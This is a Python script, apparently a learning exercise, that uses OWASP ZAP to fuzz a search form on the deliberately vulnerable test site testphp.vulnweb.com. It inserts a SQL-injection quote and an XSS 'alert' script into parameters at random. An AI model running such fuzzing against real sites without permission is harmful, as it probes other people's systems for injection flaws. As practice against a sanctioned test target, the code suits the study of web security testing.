import random
import requests
from zapv2 import ZAPv2

class ZAPFuzzer():
    def __init__(self, zap_instance):
        self.zap = zap_instance
        self.max_payloads = 3 
        self.num_iterations = 0

    def reset(self):
        self.num_iterations = 0

    def hasMorePayloads(self):
        return self.num_iterations < self.max_payloads

    def getNextPayload(self, current_payload):
        
        # call mutator to fuzz the payload
        payload = self.mutate_payload(current_payload)

        # increase the number of fuzzing attempts
        self.num_iterations += 1
        return payload

    def mutate_payload(self, original_payload):
        # select some random mutator
        picker = random.randint(1, 3)

        # select a random offset in payload to mutate
        offset = random.randint(0, len(original_payload)-1)

        front, back = original_payload[:offset], original_payload[offset:]

        # random offset insert a SQL injection attempt
        if picker == 1:
            front += "'"
        # XSS attempt
        elif picker == 2:
            front += "<script>alert('BHP!');</script>"
        # repeat random chunk of original payload
        elif picker == 3:
            chunk_length = random.randint(0, len(back)-1)
            repeater = random.randint(1, 10)
            for _ in range(repeater):
                front += original_payload[:offset + chunk_length]
        return front + back

class ZAPPayloadGenerator:
    def __init__(self, zap_instance):
        self.zap_instance = zap_instance
        self.fuzzer = ZAPFuzzer(zap_instance)

    def generate_payloads(self, current_payload):
        # reset counter
        self.fuzzer.reset()
        payloads = []
        while self.fuzzer.hasMorePayloads():
            payloads.append(self.fuzzer.getNextPayload(current_payload))
        return payloads

def perform_sniper_attack():
    # connect to ZAP instance 
    localProxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
    apikey = ''
    zap = ZAPv2(proxies=localProxy, apikey=apikey)
    payload_generator = ZAPPayloadGenerator(zap)
    headers = {
        "Host": "testphp.vulnweb.com",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "26",
        "Origin": "http://testphp.vulnweb.com",
        "Connection": "keep-alive",
        "Referer": "http://testphp.vulnweb.com/search.php?test=query",
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i",
    }
    to_fuzz = ['query', 'test', 'go']
    for fuzz in to_fuzz:
        target_url = "http://testphp.vulnweb.com/search.php?test=|query|"
        data = "searchFor=|test|&goButton=|go|"
        fuzzed_payloads = payload_generator.generate_payloads(fuzz)
        for fuzzed_payload in fuzzed_payloads:
            if fuzz == 'query':
                url = target_url.replace('|query|', fuzzed_payload)
                post_data = data.replace('|test|', 'test')
                post_data = post_data.replace('|go|', 'go')
            elif fuzz == 'test':
                url = target_url.replace('|query|', 'query')
                post_data = data.replace('|test|', fuzzed_payload)
                post_data = post_data.replace('|go|', 'go')
            else:
                url = target_url.replace('|query|', 'query')
                post_data = data.replace('|test|', 'test')
                post_data = post_data.replace('|go|', fuzzed_payload)
            print(f'URL : {url}')
            print(f'Headers : {headers}')
            print(f'Data : {post_data}\n')
            response = requests.post(url, headers=headers, data=post_data, verify=False, proxies=localProxy) 
            print(response) 

if __name__ == "__main__":
    perform_sniper_attack()

